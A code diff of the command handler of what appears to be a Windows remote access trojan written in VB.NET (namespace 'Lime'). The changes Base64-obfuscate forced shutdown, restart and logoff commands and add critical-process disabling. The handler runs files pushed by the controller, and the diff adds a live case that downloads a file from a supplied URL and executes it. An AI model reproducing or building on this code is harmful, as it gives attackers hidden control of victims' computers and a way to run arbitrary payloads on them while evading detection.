@@ -1,6 +1,5 @@
 ﻿Namespace Lime
 
-
     Public Class C_Commands
 
         Private Shared SPL = C_Settings.SPL
@@ -12,33 +11,38 @@
 
             Try
                 Select Case A(0)
-                    Case "PC-RES"
-                        Shell("Shutdown /r /f /t 00", AppWinStyle.Hide, False, -1)
-
-                    Case "PC-SHUT"
-                        Shell("Shutdown /s /f /t 00", AppWinStyle.Hide, False, -1)
-
-                    Case "PC-OUT"
-                        Shell("Shutdown /l /f /t 00", AppWinStyle.Hide, False, -1)
 
                     Case "!P"
                         C.Send("!P")
 
-                    Case "Close"
-                        End
+                    Case "PC-"
+                        Select Case A(1)
+                            Case "1"
+                                Shell(BS(Convert.FromBase64String("U2h1dGRvd24gL3IgL2YgL3QgMDA=")), AppWinStyle.Hide, False, -1) 'Shutdown /r /f /t 00
+                            Case "2"
+                                Shell(BS(Convert.FromBase64String("U2h1dGRvd24gL3MgL2YgL3QgMDA=")), AppWinStyle.Hide, False, -1) 'Shutdown /s /f /t 00
+                            Case "3"
+                                Shell(BS(Convert.FromBase64String("U2h1dGRvd24gL2wgL2Y=")), AppWinStyle.Hide, False, -1) 'Shutdown /l /f
+                        End Select
 
-                    Case "Reconnect"
-                        Diagnostics.Process.Start(C_Settings.fullpath)
-                        End
-
-                    Case "Uninstall"
-                        Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & C_ID.HWID)
-                        C_Installation.DEL()
+                    Case "CL-"
+                        Select Case A(1)
+                            Case "1"
+                                C_CriticalProcesses.CriticalProcesses_Disable()
+                                End
+                            Case "2"
+                                C_CriticalProcesses.CriticalProcesses_Disable()
+                                Diagnostics.Process.Start(C_Settings.fullpath)
+                                End
+                            Case "3"
+                                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & C_ID.HWID)
+                                C_Installation.DEL()
+                        End Select
 
                     Case "Visit"
                         Diagnostics.Process.Start(A(1))
 
-                    Case "RunDisk"
+                    Case "RD-"
                         Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(1))
                         IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                         Threading.Thread.CurrentThread.Sleep(1000)
@@ -47,9 +51,10 @@
                             C_Installation.DEL()
                         End If
 
-                    Case "RunURL"
-                        Dim NewFile = IO.Path.GetTempFileName & A(2).ToString
-                        ' My.Computer.Network.DownloadFile(A(1), NewFile)
+                    Case "RU-"
+                        Dim NewFile = IO.Path.GetTempFileName + A(2)
+                        Dim WC As New Net.WebClient
+                        WC.DownloadFile(A(1), NewFile)
                         Threading.Thread.CurrentThread.Sleep(1000)
                         Diagnostics.Process.Start(NewFile)
                         If A(3).ToString = "update" Then
